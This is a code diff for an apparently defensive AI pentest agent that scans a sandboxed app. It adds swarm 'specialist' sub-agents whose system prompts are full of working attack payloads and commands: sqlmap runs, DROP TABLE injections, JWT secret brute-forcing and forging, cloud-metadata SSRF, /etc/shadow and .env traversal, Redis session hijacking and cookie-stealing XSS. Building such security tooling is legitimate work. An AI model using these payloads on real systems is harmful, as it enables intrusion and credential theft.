@@ -47,6 +47,8 @@ interface ConfirmedFinding {
   description: string;
   evidence: string;
   remediation: string;
+  steps_to_replicate: string;
+  cvss_score: number;
   timestamp: string;
 }
 
@@ -552,13 +554,37 @@ const TOOLS: ChatCompletionTool[] = [
       parameters: {
         type: "object",
         properties: {
-          title:       { type: "string" },
-          severity:    { type: "string", enum: ["critical", "high", "medium", "low"] },
-          description: { type: "string", description: "EVIDENCE: exact command used, exact output received, proven attacker impact" },
-          evidence:    { type: "string", description: "Raw evidence — command output, HTTP response body, exact credential value" },
-          remediation: { type: "string" },
+          title:                { type: "string" },
+          severity:             { type: "string", enum: ["critical", "high", "medium", "low"] },
+          description:          { type: "string", description: "EVIDENCE: exact command used, exact output received, proven attacker impact" },
+          evidence:             { type: "string", description: "Raw evidence — command output, HTTP response body, exact credential value" },
+          remediation:          { type: "string" },
+          steps_to_replicate:   { type: "string", description: "Numbered step-by-step instructions for a pentester to reproduce this exact finding. Include exact commands, payloads, headers, expected responses." },
+          cvss_score:           { type: "number", description: "CVSS 3.1 base score (0.0–10.0). 9.0–10.0=Critical, 7.0–8.9=High, 4.0–6.9=Medium, 0.1–3.9=Low" },
         },
-        required: ["title", "severity", "description", "evidence", "remediation"],
+        required: ["title", "severity", "description", "evidence", "remediation", "steps_to_replicate"],
+      },
+    },
+  },
+  {
+    type: "function",
+    function: {
+      name: "spawn_specialist",
+      description: "Spawn a focused attack specialist agent for deep exploitation of a specific vulnerability class. Use when you've identified a clear attack surface. The specialist shares your memory and saves findings to the same store.",
+      parameters: {
+        type: "object",
+        properties: {
+          attack_type: {
+            type: "string",
+            enum: ["sql_injection", "jwt_attack", "auth_bypass", "ssrf", "xss", "file_traversal", "redis_exploit", "prototype_pollution"],
+            description: "The attack class to specialize in",
+          },
+          context: {
+            type: "string",
+            description: "Exact intelligence to give the specialist: target endpoint, parameter names, relevant source code snippets, credentials already found, specific hypothesis to test. Be specific — the specialist sees nothing else.",
+          },
+        },
+        required: ["attack_type", "context"],
       },
     },
   },
@@ -774,7 +800,7 @@ export async function runSandboxAgent(
     return JSON.stringify({ success: true });
   }
 
-  function saveFinding(title: string, severity: string, description: string, evidence: string, remediation: string): string {
+  function saveFinding(title: string, severity: string, description: string, evidence: string, remediation: string, steps_to_replicate = "", cvss_score = 0): string {
     const mem = loadMemory(memPath);
     const id = `sandbox-${Date.now()}-${mem.confirmed_findings.length}`;
     mem.confirmed_findings.push({
@@ -784,10 +810,12 @@ export async function runSandboxAgent(
       description,
       evidence: evidence.slice(0, 4000),
       remediation,
+      steps_to_replicate,
+      cvss_score,
       timestamp: new Date().toISOString(),
     });
     saveMemory(memPath, mem);
-    pushLog("finding", "save_finding", `[${severity.toUpperCase()}] ${title}`, description.slice(0, 500));
+    pushLog("finding", "save_finding", `[${severity.toUpperCase()}] ${title}`, `${description.slice(0, 400)}\n\nREPLICATE:\n${steps_to_replicate.slice(0, 300)}`);
     return JSON.stringify({ success: true, id, total_findings: mem.confirmed_findings.length });
   }
 
@@ -1017,6 +1045,239 @@ export async function runSandboxAgent(
     return logsFn(lines);
   }
 
+  // ── Swarm specialists ─────────────────────────────────────────────────────
+
+  const SPECIALIST_SYSTEMS: Record<string, string> = {
+    sql_injection: `You are a SQL injection specialist. Your ONLY job is to find and prove SQL injection in the target app.
+
+APPROACH:
+1. Check every endpoint/parameter identified in the context for SQLi
+2. Use sqlmap: exec_cmd(["sh","-c","sqlmap -u 'URL' --batch --level=3 --risk=2 --dbs --timeout=10 2>/dev/null | tail -30"])
+3. Manual payloads: ' OR '1'='1, '; DROP TABLE--,  1 UNION SELECT 1,2,3--
+4. Blind SQLi: ' AND SLEEP(5)--, ' AND 1=1--, ' AND 1=2--
+5. Check error messages for DB type (MySQL, Postgres, SQLite, MSSQL)
+6. If injection found: dump the users/credentials table
+7. web_search("sqlmap bypass WAF 2024") if blocked
+8. crawl_url HackTricks SQLi page for bypass techniques
+
+Save EVERY confirmed injection with exact payload, exact response, and sqlmap output as evidence.
+Steps to replicate MUST include exact sqlmap command or curl command that proves it.`,
+
+    jwt_attack: `You are a JWT attack specialist. Your ONLY job is to break JWT authentication.
+
+APPROACH:
+1. Get a JWT from the login endpoint or any auth response
+2. Decode it: exec_cmd(["sh","-c","python3 -c \\"import jwt,json,base64; t='TOKEN'; p=t.split('.')[1]; p+='=='*(-len(p)%4); print(json.dumps(json.loads(base64.b64decode(p).decode()),indent=2))\\""])
+3. Check algorithm — if HS256: brute the secret: exec_cmd(["sh","-c","for s in secret password admin key jwt 123456 supersecret qwerty; do python3 -c \\"import jwt; jwt.decode('TOKEN','$s',algorithms=['HS256']); print('CRACKED:$s')\\" 2>/dev/null && break; done"])
+4. Try alg:none attack: exec_cmd(["sh","-c","python3 -c \\"import base64,json; h=base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode(); p=base64.b64encode(json.dumps({'role':'admin','id':1,'exp':9999999999}).encode()).rstrip(b'=').decode(); print(f'{h}.{p}.')\\""])
+5. If JWT_SECRET in env: forge admin token immediately
+6. Test forged token on /admin, /api/admin/*, /api/users, /api/v1/admin
+7. RS256→HS256 confusion if public key available
+8. web_search("JWT algorithm confusion attack 2024") for latest techniques
+
+Save with EXACT forged token, exact endpoint tested, exact HTTP response as evidence.`,
+
+    auth_bypass: `You are an authentication bypass specialist. Your ONLY job is to bypass authentication.
+
+APPROACH:
+1. MASTER_API_KEY bypass: test x-api-key, X-Master-Key, Authorization headers with known key value
+2. Default creds: admin:admin, admin:password, root:root, test:test on /login /api/auth /api/sessions
+3. Header bypass: X-Forwarded-For: 127.0.0.1, X-Real-IP: 127.0.0.1, X-Original-URL: /admin on all 401/403 endpoints
+4. IDOR: enumerate /api/users/1, /api/users/2 — access other users' data without auth
+5. Mass assignment: POST to endpoints with role=admin, is_admin=true, admin=1
+6. Source code analysis: find routes WITHOUT @UseGuards, @Public() on sensitive endpoints
+7. Try all endpoints without token first, then with expired token, then with wrong user's token
+8. exec_cmd find routes with public decorator but sensitive operations
+
+Save EVERY bypass with exact request (headers, body) and exact response proving access.`,
+
+    ssrf: `You are an SSRF specialist. Your ONLY job is to find Server-Side Request Forgery.
+
+APPROACH:
+1. Find all URL/endpoint/webhook/callback/redirect/proxy/fetch parameters in the API
+2. Test AWS metadata: ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+3. Test GCP metadata: ?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+4. Internal services via SSRF: ?url=http://127.0.0.1:6379, ?url=http://127.0.0.1:27017, ?url=http://127.0.0.1:9200
+5. File read via SSRF: ?url=file:///etc/passwd, ?url=file:///app/.env
+6. Bypass filters: ?url=http://[::1]:3000, ?url=http://0x7f000001, ?url=http://127.1
+7. Source code: grep for fetch(), axios(), request(), http.get() with user-controlled URLs
+8. web_search("SSRF bypass whitelist 2024") for latest bypass techniques
+
+Save with EXACT parameter, EXACT URL payload, EXACT response content proving internal access.`,
+
+    xss: `You are an XSS specialist. Your ONLY job is to find and prove Cross-Site Scripting.
+
+APPROACH:
+1. Test every text input/search/query parameter: <script>alert(document.domain)</script>
+2. Reflected: http("GET", "/search?q=<img src=x onerror=alert(1)>") — check if reflected unescaped
+3. Stored: POST <script>alert(document.cookie)</script> to comments/profile/name fields
+4. DOM XSS: check source code for innerHTML, document.write, eval() with user input
+5. Template injection confusion: test {{7*7}}, ${7*7} — if 49 returned it's SSTI not XSS
+6. CSP bypass: check Content-Security-Policy header — if missing or weak: exploit
+7. JSONP/CORS: look for callback= parameters that reflect user input into JS
+8. Angular/React: check for bypassSecurityTrust, dangerouslySetInnerHTML in source
+
+Save with EXACT payload, EXACT URL, EXACT response showing unescaped reflection or execution.`,
+
+    file_traversal: `You are a path traversal specialist. Your ONLY job is to find file read/traversal vulnerabilities.
+
+APPROACH:
+1. Test all file/path/name/doc parameters: ../../../../etc/passwd
+2. URL encoding: ..%2F..%2F..%2Fetc%2Fpasswd, %2e%2e%2f%2e%2e%2fetc%2fpasswd
+3. Double encoding: ..%252F..%252Fetc%252Fpasswd
+4. Null byte: ../../../../etc/passwd%00.jpg (PHP)
+5. Test file serving endpoints: /api/files/download?path=, /static?file=, /download?name=
+6. ZIP slip: if file upload exists, craft malicious zip with ../../etc/passwd entries
+7. Symlink attacks in upload endpoints
+8. Source: grep for path.join, readFileSync, open() with user-supplied values
+9. Target: /etc/passwd, /etc/shadow, /app/.env, /proc/self/environ, /proc/1/cmdline
+
+Save with EXACT traversal payload, EXACT response content (first 500 chars of file read).`,
+
+    redis_exploit: `You are a Redis exploitation specialist. Your ONLY job is to exploit Redis and session stores.
+
+APPROACH:
+1. Connect: exec_cmd(["sh","-c","redis-cli -h 127.0.0.1 PING 2>/dev/null && echo CONNECTED"])
+2. No auth: exec_cmd(["sh","-c","redis-cli -h 127.0.0.1 CONFIG GET requirepass 2>/dev/null"])
+3. Dump ALL keys: exec_cmd(["sh","-c","redis-cli -h 127.0.0.1 KEYS '*' 2>/dev/null | head -30"])
+4. Read session keys: exec_cmd(["sh","-c","redis-cli -h 127.0.0.1 KEYS 'sess:*' | head -5 | xargs -I{} redis-cli -h 127.0.0.1 GET {} 2>/dev/null"])
+5. Find admin sessions: look for role:admin, is_admin:true in session data
+6. If admin session found: extract session ID → use as cookie → test on /api/admin/*
+7. Cache poisoning: SET cache key to malicious value
+8. If Upstash Redis (cloud): check UPSTASH_REDIS_TOKEN in env → test against Upstash REST API
+9. web_search("Redis unauthorized access RCE 2024")
+
+Save with EXACT Redis command, EXACT key content, EXACT proof of session access.`,
+
+    prototype_pollution: `You are a prototype pollution specialist. Your ONLY job is to find prototype pollution vulnerabilities.
+
+APPROACH:
+1. JSON body: POST {"__proto__":{"admin":true,"role":"admin","isAdmin":true}} to every endpoint
+2. Query string: ?__proto__[admin]=true&__proto__[role]=admin
+3. Constructor: POST {"constructor":{"prototype":{"admin":true}}}
+4. After each attempt: http("GET", "/api/users/me") — check if role/admin changed
+5. Source code: grep for merge(), extend(), deepMerge(), Object.assign() with user input
+   exec_cmd(["sh","-c","grep -r 'merge\\|extend\\|deepMerge\\|assign' /app/src 2>/dev/null | grep -v 'node_modules\\|test' | head -20"])
+6. Express: test if __proto__.admin=true affects global Object prototype
+7. npm packages: check package.json for vulnerable merge libraries (lodash < 4.17.12, merge < 2.1.1)
+8. web_search("prototype pollution RCE Node.js 2024 Express")
+9. crawl_url("https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution")
+
+Save with EXACT payload, EXACT endpoint, EXACT response showing pollution effect.`,
+  };
+
+  const SPECIALIST_TOOLS: ChatCompletionTool[] = [
+    {
+      type: "function",
+      function: {
+        name: "exec_cmd",
+        description: "Execute a shell command inside the container.",
+        parameters: {
+          type: "object",
+          properties: {
+            cmd: { type: "array", items: { type: "string" } },
+            timeout_seconds: { type: "number" },
+          },
+          required: ["cmd"],
+        },
+      },
+    },
+    {
+      type: "function",
+      function: {
+        name: "http",
+        description: "Make an HTTP request to the target.",
+        parameters: {
+          type: "object",
+          properties: {
+            method:  { type: "string", enum: ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"] },
+            path:    { type: "string" },
+            headers: { type: "object", additionalProperties: { type: "string" } },
+            body:    { type: "string" },
+          },
+          required: ["method", "path"],
+        },
+      },
+    },
+    {
+      type: "function",
+      function: {
+        name: "save_finding",
+        description: "Save a confirmed vulnerability with full replication steps.",
+        parameters: {
+          type: "object",
+          properties: {
+            title:              { type: "string" },
+            severity:           { type: "string", enum: ["critical", "high", "medium", "low"] },
+            description:        { type: "string" },
+            evidence:           { type: "string" },
+            remediation:        { type: "string" },
+            steps_to_replicate: { type: "string" },
+            cvss_score:         { type: "number" },
+          },
+          required: ["title", "severity", "description", "evidence", "remediation", "steps_to_replicate"],
+        },
+      },
+    },
+    {
+      type: "function",
+      function: {
+        name: "web_search",
+        description: "Search for exploit techniques, CVEs, bypass methods.",
+        parameters: { type: "object", properties: { query: { type: "string" } }, required: ["query"] },
+      },
+    },
+    {
+      type: "function",
+      function: {
+        name: "crawl_url",
+        description: "Fetch a security resource — HackTricks, NVD, PortSwigger.",
+        parameters: { type: "object", properties: { url: { type: "string" } }, required: ["url"] },
+      },
+    },
+  ];
+
+  async function spawnSpecialist(attackType: string, context: string): Promise<string> {
+    const systemPrompt = SPECIALIST_SYSTEMS[attackType];
+    if (!systemPrompt) {
+      return JSON.stringify({ error: `Unknown specialist: ${attackType}. Available: ${Object.keys(SPECIALIST_SYSTEMS).join(", ")}` });
+    }
+
+    pushLog("info", "spawn_specialist", attackType, `Specialist spawned — context: ${context.slice(0, 200)}`);
+
+    try {
+      await agentLoop(
+        {
+          system: systemPrompt,
+          messages: [{
+            role: "user",
+            content: `TARGET: ${baseUrl}\nCONTAINER PORT: ${appPort}\n\nINTEL FROM COORDINATOR:\n${context}\n\nAttack this specific vector now. Save every confirmed finding via save_finding with exact evidence and numbered replication steps.`,
+          }],
+          tools: SPECIALIST_TOOLS,
+          temperature: 0.05,
+          maxTokens: 8192,
+          maxIterations: 20,
+        },
+        async (toolName, args) => {
+          const a = args as Record<string, unknown>;
+          switch (toolName) {
+            case "exec_cmd":    return execCmd(a["cmd"] as string[], Number(a["timeout_seconds"] ?? 60));
+            case "http":        return httpTool(String(a["method"] ?? "GET"), String(a["path"] ?? "/"), (a["headers"] as Record<string, string>) ?? {}, a["body"] ? String(a["body"]) : undefined);
+            case "save_finding": return saveFinding(String(a["title"] ?? ""), String(a["severity"] ?? "low"), String(a["description"] ?? ""), String(a["evidence"] ?? ""), String(a["remediation"] ?? ""), String(a["steps_to_replicate"] ?? ""), Number(a["cvss_score"] ?? 0));
+            case "web_search":  { const r = await webSearch(String(a["query"] ?? ""), 10); pushLog("search", "web_search", String(a["query"] ?? ""), r.slice(0, 800)); return r; }
+            case "crawl_url":   { const r = await crawlUrl(String(a["url"] ?? "")); pushLog("crawl", "crawl_url", String(a["url"] ?? ""), r.slice(0, 800)); return r; }
+            default: return JSON.stringify({ error: `Unknown tool: ${toolName}` });
+          }
+        }
+      );
+    } catch (e) {
+      logger.debug(`[specialist:${attackType}] error: ${e}`);
+    }
+
+    const mem = loadMemory(memPath);
+    return JSON.stringify({ specialist: attackType, status: "complete", total_findings: mem.confirmed_findings.length });
+  }
+
   // ── Agent loop ────────────────────────────────────────────────────────────
 
   const serviceHint = serviceSubpath
@@ -1083,7 +1344,21 @@ STEP 6 — OWASP TOP 10 THOROUGH SWEEP:
   A7 XSS: http("GET", "/search?q=<script>alert(1)</script>") and check reflection
   A10 SSRF: test url/endpoint/callback params with http://169.254.169.254/latest/meta-data
 
-  After every finding: save_finding() with exact command + output as evidence.
+STEP 7 — SWARM SPECIALIST ATTACKS:
+  After recon, spawn focused specialists for every attack surface identified:
+  - Found SQL queries or DB access → spawn_specialist("sql_injection", "endpoint: ..., parameter: ..., source code: ...")
+  - Found JWT or JWT_SECRET → spawn_specialist("jwt_attack", "JWT_SECRET=..., login endpoint: ..., admin endpoint: ...")
+  - Found unguarded routes or MASTER_API_KEY → spawn_specialist("auth_bypass", "routes: ..., key value: ..., guard code: ...")
+  - Found URL parameters or fetch() calls → spawn_specialist("ssrf", "parameter: ..., endpoint: ..., source: ...")
+  - Found text input reflection → spawn_specialist("xss", "endpoint: ..., parameter: ..., response snippet: ...")
+  - Found file serving → spawn_specialist("file_traversal", "endpoint: ..., parameter: ...")
+  - Redis open → spawn_specialist("redis_exploit", "port 6379 open, UPSTASH_REDIS_TOKEN=...")
+  - Found deep object merge → spawn_specialist("prototype_pollution", "endpoint: ..., merge function: ...")
+
+  Specialists run focused 20-iteration attacks on their domain and save findings directly.
+  Spawn multiple specialists in sequence — each gets precise context from your recon.
+
+  After every finding: save_finding() with exact command + output + steps_to_replicate + cvss_score.
   After every attempt (success or fail): record_attempt()
   After every 4 commands: update_worldview()
   After every chain: save_attack_chain()
@@ -1114,7 +1389,8 @@ Begin immediately with STEP 1.`;
           case "save_finding":      return saveFinding(
             String(a["title"] ?? ""), String(a["severity"] ?? "low"),
             String(a["description"] ?? ""), String(a["evidence"] ?? ""),
-            String(a["remediation"] ?? ""),
+            String(a["remediation"] ?? ""), String(a["steps_to_replicate"] ?? ""),
+            Number(a["cvss_score"] ?? 0),
           );
           case "record_attempt":    return recordAttempt(
             String(a["attack"] ?? ""), String(a["target"] ?? ""),
@@ -1139,6 +1415,7 @@ Begin immediately with STEP 1.`;
             a["body"] ? String(a["body"]) : undefined,
           );
           case "get_logs":          return getLogsTool(Number(a["lines"] ?? 200));
+          case "spawn_specialist":  return spawnSpecialist(String(a["attack_type"] ?? ""), String(a["context"] ?? ""));
           case "web_search": {
             const query = String(a["query"] ?? "");
             const searchResult = await webSearch(query, 10);
@@ -1198,7 +1475,11 @@ Begin immediately with STEP 1.`;
     description: f.description,
     remediation: f.remediation,
     references: [],
-    detail: f.evidence.slice(0, 600),
+    detail: [
+      f.evidence.slice(0, 600),
+      f.steps_to_replicate ? `\n\nREPLICATION STEPS:\n${f.steps_to_replicate}` : "",
+      f.cvss_score > 0 ? `\n\nCVSS: ${f.cvss_score}` : "",
+    ].join(""),
   }));
 
   const allFindings = [...memoryFindings, ...dedupedAdditional];
